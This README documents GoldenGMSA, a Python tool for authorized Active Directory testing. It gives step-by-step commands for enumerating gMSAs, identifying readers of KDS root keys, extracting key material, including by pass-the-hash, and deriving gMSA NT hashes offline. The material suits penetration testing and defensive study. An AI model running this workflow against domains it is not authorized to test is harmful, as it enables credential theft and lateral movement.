# GoldenGMSA

GoldenGMSA is a cross-platform Python tool for authorized Active Directory
assessment of Group Managed Service Accounts (gMSAs). It uses Impacket to run
from macOS or Linux and can:

- enumerate gMSAs and the identifiers needed for password derivation;
- identify users, groups, and computers allowed to read managed passwords or
  KDS root keys;
- expand reader groups to show the accounts that can actually authenticate;
- retrieve KDS root-key material with NTLM, pass-the-hash, or Kerberos;
- generate a complete command for offline gMSA password computation; and
- compute the gMSA NT hash and LM:NT value from previously collected material.

Use this tool only on systems you own or are explicitly authorized to assess.
KDS root keys, managed-password data, and generated hashes are secrets.

## Requirements

- macOS or Linux
- Python 3.10 or newer
- [`uv`](https://docs.astral.sh/uv/)
- network access to an Active Directory domain controller for enumeration and
  extraction commands

The executable declares its own Python dependencies, so no separate virtual
environment or requirements file is needed.

## Run the tool

Clone the repository and enter this directory:

```bash
git clone https://github.com/sho-luv/gpt_tools.git
cd gpt_tools/goldengmsa
uv run ./goldengmsa.py --help
```

Run a command-specific help page with:

```bash
uv run ./goldengmsa.py gmsainfo --help
uv run ./goldengmsa.py readers --help
uv run ./goldengmsa.py kdsinfo --help
uv run ./goldengmsa.py compute --help
```

## Authentication

Online commands use the standard Impacket target format:

```text
domain/username[:password][@target]
```

Examples:

```bash
# Prompt for the password
uv run ./goldengmsa.py gmsainfo \
  'corp.local/auditor@dc01.corp.local'

# Password supplied in the target
uv run ./goldengmsa.py gmsainfo \
  'corp.local/auditor:ExamplePassword!@dc01.corp.local'

# Pass the NT hash
uv run ./goldengmsa.py gmsainfo \
  'corp.local/auditor@dc01.corp.local' \
  -hashes ':AUDITOR_NT_HASH'

# Use the current Kerberos credential cache
KRB5CCNAME=user.ccache uv run ./goldengmsa.py gmsainfo \
  'corp.local/auditor@dc01.corp.local' -k
```

An inline password, `-hashes`, `-k`, or `-aesKey` prevents a password prompt.
`-no-pass` is only needed when you intentionally want no prompt and are not
supplying another credential.

Use `-dc-ip <IP>` when DNS does not resolve the domain controller. With
Kerberos, keep the hostname in the target and use `-dc-host` when you need to
select a particular domain controller.

## Recommended workflow

### 1. Enumerate gMSAs

Start with `gmsainfo` to list the accounts and the identifiers associated with
each account:

```bash
uv run ./goldengmsa.py gmsainfo \
  'corp.local/auditor@dc01.corp.local' \
  -hashes ':AUDITOR_NT_HASH'
```

For each gMSA, the output labels the values by the command option that consumes
them:

```text
Account: svc_sql$
gMSA SID for compute (--sid): S-1-5-21-...-1112
Root key GUID for kdsinfo (--guid): 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
Managed password ID for compute (--pwdid): <BASE64_MANAGED_PASSWORD_ID>
```

### 2. Identify valid readers

Run `readers` with an account that can query the directory:

```bash
uv run ./goldengmsa.py readers \
  'corp.local/auditor@dc01.corp.local' \
  -hashes ':AUDITOR_NT_HASH'
```

The command shows direct ACL trustees and expands groups into their user and
computer members. It separates managed-password readers from KDS root-key
readers and prints candidate pass-the-hash commands for applicable accounts.
Use `--no-expand-groups` only when you want to see direct trustees without
their members.

Example:

```text
Managed-password readers
------------------------
CORP\SQL-GMSA-READERS                 group     direct
  CORP\SQL01$                         computer  group-derived
  CORP\SQL02$                         computer  group-derived
  CORP\svc_deployment                 user      group-derived

KDS root-key readers
--------------------
CORP\Domain Admins                    group     direct
  CORP\Administrator                  user      group-derived
```

### 3. Retrieve the KDS key

Authenticate as a listed KDS root-key reader and supply the root key GUID from
`gmsainfo`:

```bash
uv run ./goldengmsa.py kdsinfo \
  'corp.local/Administrator@dc01.corp.local' \
  --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb \
  --domain corp.local \
  --show-secrets \
  -hashes ':READER_NT_HASH'
```

`--show-secrets` is required before the command prints KDS key material.

When `--sid` and `--pwdid` are omitted, `kdsinfo` enumerates gMSAs in
`--domain`, matches their `msDS-ManagedPasswordId` to the requested root-key
GUID, and prints every value needed by `compute`:

```text
Root key GUID (reference): 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
KDS key for compute (--kdskey): <EXTRACTED_BASE64_KDS_KEY>

Matching gMSA: svc_sql$
gMSA SID for compute (--sid): S-1-5-21-...-1112
Managed password ID for compute (--pwdid): <EXTRACTED_BASE64_MANAGED_PASSWORD_ID>

Offline compute command:
./goldengmsa.py compute \
  --sid S-1-5-21-...-1112 \
  --kdskey <EXTRACTED_BASE64_KDS_KEY> \
  --pwdid <EXTRACTED_BASE64_MANAGED_PASSWORD_ID> \
  --show-secrets
```

The generated command contains the actual extracted Base64 values, not
placeholders. The GUID is query/reference metadata for `kdsinfo`; it is not a
`compute` option. If the gMSA is in another child domain, use that domain with
`--domain`. `--forest` selects the forest used for the KDS
configuration-partition query.

### 4. Compute the credential offline

Copy the command printed by `kdsinfo`. No domain connection or authentication
is required when all three inputs are supplied:

```bash
uv run ./goldengmsa.py compute \
  --sid 'S-1-5-21-1437000690-1664695696-1586295871-1112' \
  --kdskey '<EXTRACTED_BASE64_KDS_KEY>' \
  --pwdid '<EXTRACTED_BASE64_MANAGED_PASSWORD_ID>' \
  --show-secrets
```

The output includes the NT hash, a ready-to-use LM:NT representation, and the
Base64-encoded managed password.

## Commands

| Command | Purpose |
| --- | --- |
| `gmsainfo` | Enumerate gMSAs, SIDs, root-key GUIDs, and managed-password IDs. |
| `readers` | Resolve managed-password and KDS root-key ACL readers and group members. |
| `kdsinfo` | Retrieve KDS root-key information and generate offline compute commands. |
| `compute` | Derive a gMSA credential online or entirely offline. |

## Files

| File | Purpose |
| --- | --- |
| `goldengmsa.py` | Executable CLI and the `gmsainfo` and `compute` commands. |
| `goldengmsa_options.py` | Shared Impacket-style CLI authentication options. |
| `goldengmsa_ldap.py` | LDAP connections and Active Directory queries. |
| `goldengmsa_acl.py` | Active Directory security descriptor and ACL parsing. |
| `goldengmsa_readers.py` | Reader discovery and group expansion logic. |
| `goldengmsa_readers_cli.py` | Output and command handling for `readers`. |
| `goldengmsa_kdsinfo_cli.py` | Output and command handling for `kdsinfo`. |
| `goldengmsa_crypto.py` | KDS blob parsing and gMSA password derivation. |
| `goldengmsa_cli_support.py` | Shared credential parsing and safe command rendering. |

No separate license is included in this directory; the repository license
applies to the tool.
